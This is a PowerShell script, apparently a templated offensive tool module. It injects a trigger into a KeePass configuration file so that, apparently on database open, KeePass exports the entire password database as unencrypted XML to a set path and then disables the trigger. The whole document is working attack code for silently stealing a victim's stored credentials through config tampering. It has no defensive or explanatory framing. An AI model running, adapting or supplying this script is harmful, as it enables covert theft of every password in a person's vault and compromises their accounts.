$ExportPath = "REPLACE_ME_ExportPath"
$ExportName = "REPLACE_ME_ExportName"
$TriggerName = "REPLACE_ME_TriggerName"
$KeePassXMLPath = "REPLACE_ME_KeePassXMLPath"
$TriggerXML = [xml] @"
<Trigger>
    <Guid>$([Convert]::ToBase64String([System.GUID]::NewGuid().ToByteArray()))</Guid>
	<Name>$TriggerName</Name>
	<TurnOffAfterAction>true</TurnOffAfterAction>
	<Events>
		<Event>
			<TypeGuid>bES7XfGLTA2IzmXm6a0pig==</TypeGuid>
			<Parameters>
				<Parameter>1</Parameter>
				<Parameter>False</Parameter>
			</Parameters>
		</Event>
	</Events>
	<Conditions />
	<Actions>
		<Action>
			<TypeGuid>D5prW87VRr65NO2xP5RIIg==</TypeGuid>
			<Parameters>
				<Parameter>$ExportPath\$ExportName</Parameter>
				<Parameter>KeePass XML (2.x)</Parameter>
				<Parameter />
				<Parameter />
			</Parameters>
		</Action>
	</Actions>
</Trigger>
"@
if($KeePassXMLPath -and ($KeePassXMLPath -match '.\.xml$') -and (Test-Path -Path $KeePassXMLPath) ) {
    $KeePassXMLPath = Resolve-Path -Path $KeePassXMLPath
    $KeePassXML = [xml](Get-Content -Path $KeePassXMLPath)
    if ($KeePassXML.Configuration.Application.TriggerSystem.Triggers -is [String]) {
        $Triggers = $KeePassXML.CreateElement('Triggers')
        $Null = $Triggers.AppendChild($KeePassXML.ImportNode($TriggerXML.Trigger, $True))
        $Null = $KeePassXML.Configuration.Application.TriggerSystem.ReplaceChild($Triggers, $KeePassXML.Configuration.Application.TriggerSystem.SelectSingleNode('Triggers'))
    }
    else {
        $Null = $KeePassXML.Configuration.Application.TriggerSystem.Triggers.AppendChild($KeePassXML.ImportNode($TriggerXML.Trigger, $True))
    }
    $KeePassXML.Save($KeePassXMLPath)
}